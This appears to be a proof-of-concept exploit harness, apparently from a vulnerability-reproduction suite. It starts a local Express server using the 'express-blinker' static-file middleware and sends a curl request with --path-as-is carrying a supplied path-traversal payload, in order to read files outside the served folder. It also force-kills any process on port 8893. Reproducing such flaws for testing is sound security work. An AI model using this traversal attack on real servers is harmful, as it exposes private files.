function exploitFunction(payload) {
  const express = require("express");
  let app = express();
  const pkg = require("express-blinker");
  const fs = require("fs");
  const { exec } = require("child_process");

  let hostsFile = fs.readFileSync(payload()).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 8893/tcp", () => {});
  } catch (e) {}

  app.use(
    pkg(__dirname, [
      {
        test: /.*/,
        etag: true,
        lastModified: false,
        cacheControl: true,
        expires: false,
        age: 600,
      },
    ])
  );

  app.listen(8893);

  return new Promise((resolve) => {
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8893${payload()}"`;
    exec(attack_string, (error, stdout) => {
      resolve(stdout);
    });
  });
}

module.exports = { exploitFunction };